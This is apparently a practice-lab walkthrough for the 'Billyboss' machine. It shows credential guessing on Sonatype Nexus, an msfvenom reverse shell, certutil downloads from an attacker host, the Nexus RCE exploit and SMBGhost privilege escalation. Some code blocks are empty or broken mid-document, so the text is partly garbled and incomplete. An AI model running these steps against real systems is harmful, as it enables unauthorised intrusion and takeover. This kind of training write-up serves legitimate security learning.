# Exploitation Guide for Billyboss

## Summary

We'll gain a foothold on this machine with some basic password guessing. We'll then exploit a remote code execution vulnerability in the Sonatype Nexus application installed on this machine. Finally, we'll exploit the SMBGhost vulnerability to escalate our privileges.

## Enumeration

### Nmap

We'll start off with a simple Nmap scan.

```
kali@kali:~$ sudo nmap 192.168.140.61
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 01:33 EST
Nmap scan report for 192.168.140.61
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
```

### Sonatype Nexus

Browsing to the website on port 8081, we find an installation of Sonatype Nexus. A quick online search reveals that there are no default credentials we can exploit. However, after a few educated guesses, we log in as `nexus:nexus`.

According to the information in the top-left corner, the target is running Sonatype Nexus version 3.21.0-05.

## Exploitation

### Sonatype Nexus Authenticated Code Execution

An EDB search reveals that version 3.21.0-05 of Sonatype Nexus is vulnerable to a [remote code execution exploit](https://www.exploit-db.com/exploits/49385). To run the exploit, we'll first generate an MSFVenom reverse shell payload.

```
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.118.3 LPORT=8081
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

We'll host our payload over HTTP.

```
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's start a Netcat handler on port 8081 to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
```

We'll modify the exploit as follows:

```
URL='http://192.168.140.61:8081'
CMD='cmd.exe /c certutil -urlcache -split -f http://192.168.118.3/shell.exe shell.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

Next, we'll run the exploit to download our payload.

```
kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed
```

We'll make a few more modifications, this time executing our payload.

```
CMD='cmd.exe /c shell.exe'
```

Let's run the exploit again.

```
kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed
```

Finally, we catch our reverse shell as `nathan`.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.140.61: inverse host lookup failed: Host name lookup failure

### Installed Patches Enumeration

Listing the installed KBs, we learn that the most recently installed patch is `KB4540673`. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.

### SMB Settings Enumeration

To further confirm the SMBGhost vulnerability, we check the listening ports and find that port 445 is open.

```

### SMBGhost Exploitation

We'll use [this exploit](https://github.com/danigargu/CVE-2020-0796) against the SMB service. Starting with line 204 in **exploit.cpp**, we'll replace the shellcode with a reverse shell.

```

Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we'll set the target to `x64` and `Release` and compile the exploit. We can host the compiled exploit on our attack machine over HTTP and then download it to the target using the low-privileged shell.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>certutil -urlcache -split -f http://192.168.118.3/cve-2020-0796-local.exe cve-2020-0796-local.exe

```

Let's start a Netcat handler to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8081

```

We can now trigger the exploit.
